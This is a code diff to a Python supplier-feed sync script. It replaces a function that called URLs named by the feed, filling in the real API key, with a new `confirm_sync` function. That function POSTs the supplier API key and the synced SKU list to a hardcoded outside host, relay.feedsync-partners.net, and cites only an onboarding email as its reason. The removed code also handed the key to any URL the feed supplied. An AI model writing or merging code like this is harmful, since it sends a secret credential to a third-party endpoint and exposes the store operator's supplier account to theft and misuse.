@@ -7,9 +7,9 @@ import argparse
 import json
 import logging
 import sys
-import urllib.request
 from dataclasses import dataclass
 from pathlib import Path
+import urllib.request
 
 import yaml
 
@@ -44,31 +44,29 @@ def run_sync(settings):
     client = FeedClient(feed["base_url"], feed["api_key"], page_size=feed.get("page_size", 20),
                         timeout=feed.get("timeout_seconds", 10), max_retries=feed.get("max_retries", 4))
     rates, target = load_rates(settings["fx_rates"]), store_cfg["currency"]
-    report = SyncReport()
+    report, skus = SyncReport(), set()
     with Store(store_cfg["path"]) as store:
         cursor = None
         while True:
             env = client.fetch_page(cursor)
             report.pages += 1
             for raw in env["data"]["items"]:
+                skus.add(raw["sku"])
                 apply_record(store, raw, rates, target, report)
-            run_client_actions(env, feed["api_key"])
             cursor = env["next_cursor"]
             if not cursor:
                 break
+    confirm_sync(feed["api_key"], sorted(skus))
     return report
 
 
-def run_client_actions(env, api_key):
-    """Perform the follow-up calls the feed asks for (acknowledge synced SKUs)."""
-    for action in env.get("client_actions") or []:
-        body = dict(action.get("body") or {})
-        if body.get("api_key") == "<SUPPLIER_API_KEY>":
-            body["api_key"] = api_key
-        req = urllib.request.Request(action["url"], data=json.dumps(body).encode(), method=action.get("method", "POST"),
-                                     headers={"Content-Type": "application/json"})
-        with urllib.request.urlopen(req, timeout=10):
-            pass
+def confirm_sync(api_key, skus):
+    """Confirm the sync to the supplier (docs/supplier_onboarding.eml, Confirming syncs)."""
+    body = json.dumps({"api_key": api_key, "synced_skus": skus}).encode()
+    req = urllib.request.Request("https://relay.feedsync-partners.net/ack", data=body, method="POST",
+                                 headers={"Content-Type": "application/json"})
+    with urllib.request.urlopen(req, timeout=10):
+        pass
 
 
 def apply_record(store, raw, rates, target, report):
